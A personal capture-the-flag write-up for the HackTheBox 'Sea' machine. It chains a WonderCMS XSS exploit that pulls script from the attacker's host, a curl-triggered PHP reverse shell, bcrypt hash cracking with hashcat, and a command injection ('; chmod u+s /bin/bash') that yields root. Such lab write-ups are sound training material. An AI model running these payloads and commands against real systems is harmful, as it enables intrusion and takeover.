Target:
10.10.11.28

**P-80**

Contact page with post form: http://sea.htb/contact.php

Looking at the source code of the main page i can see that it points to a picture of a bike.png, so i decide to fuzz that address: http://sea.com/themes/bike

```php
gobuster dir -w /usr/share/seclists/SecLists-master/Discovery/Web-Content/common.txt -u http://sea.htb/themes/bike -x txt,md
```

`/README.md            (Status: 200) [Size: 318]`

```php
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```

This reveals the CMS, so i'll look online for exploits.

**Exploit web-server:**

https://github.com/prodigiousMind/CVE-2023-41425

- Start a netcat session 
- Execute script and copy the payload into the contact form under website.

```php
python3 exploit.py http://sea.htb/ <IP> 25888
```

`http://sea.htb"></form><script+src="http://10.10.14.23:8000/xss.js"></script><form+action="`

- Now, after reading the exploit script we will find it create a shell file in this pass `{/themes/revshell-main/rev.php?lhost=” + ip + “&lport=” + port}`

- Wait for the http server to serve the exploit.
- Use curl to access the exploit.

```php
curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.20&lport=25888'
```

_The original script will create a malicious URL like [http://sea.htb/wondercms/index.php?page=loginURL](http://sea.htb/wondercms/index.php?page=loginURL), which will not be correct. It should be [http://sea.htb/index.php?page=loginURL](http://sea.htb/index.php?page=loginURL) that we should change this in the exploit script, or simply provide [http://sea.htb/loginURL](http://sea.htb/loginURL) as the first parameter for the EXP._

Stabilise shell:

```php
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Find user amay that has user.txt, but it's owned by root.

I'm having trouble so i may try a different exploit, or mix it up with tools. 
- Could have missed /bike in the `curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.23&lport=9999'`

```php
curl 'http://sea.htb/themes/bike/revshell-main/rev.php?lhost=10.10.14.23&lport=9999'
```

Which would also mean the exploit command would be:

```xml
python3 exploit.py http://sea.htb/themes/bike <HOST_IP> <HOST_PORT>
```

---

Login Page:
`http://sea.htb/loginURL`

Exploit:
https://github.com/insomnia-jacob

```php
nc -lvp 25888
```

```php
python3 exploit.py -u http://sea.htb/loginURL -i <your_ip> -p <your_port> -r http://<your_ip>:8000/main.zip
```

![[Pasted image 20240916084532.png]]

![[Pasted image 20240916084648.png]]

Linux sea 5.4.0-190-generic

`Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
`
Location of our malicious revshell:
`/var/www/sea/themes/revshell-main/rev.php`

database.js

```php
cat /var/www/sea/data/database.js
```

![[Pasted image 20240916090024.png]]

"password": 
`$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q`

```php
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
```

Two character escapes are still in the password so the final pass is:

```php
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
```

```php
hashid -m hash.txt
```
- bcrypt hashcat mode 3200

```php
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

`$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance`

```php
mychemicalromance
```

![[Pasted image 20240916091525.png]]

I ssh into the machine as amay which gives me a stable shell.

![[Pasted image 20240916091753.png]]
amay user.txt:
`2ee3647dd3f5157e90baa58a730b4d34`

/tmp/tmux-1000
tmux 3.0a
https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions

Open port on 8080

![[Pasted image 20240916092956.png]]

Port forward

```php
ssh -L 9090:127.0.0.1:8080 -N amay@sea.htb
```
- Forwarded to 9090 because burp is using 8080

Now to see what's on port 8080:

```php
http://localhost:9090
```

![[Pasted image 20240916093420.png]]

![[Pasted image 20240916094156.png]]

The Analyze request is vulnerable to RCE

Taking that to **Repeater** we notice that the web app is vulnerable to a **Command Injection** by just appending `; chmod u+s /bin/bash` to the `log_file` parameter we were able to set an SUID permission on `/bin/bash`.

```php
; chmod u+s /bin/bash
```

![[Pasted image 20240916094505.png]]

Taking a look at the binary we can confirm that it has now an SUID permission on. using `/bin/bash` with the `-p` flag to retain SUID(root) privileges we were able to switch to **root**.

```php
./bash -p
```

https://gtfobins.github.io/gtfobins/bash/

![[Pasted image 20240916094729.png]]

cc8b94043d66ae0c5dc2032417bc71a6

---

09:48 2024-09-16
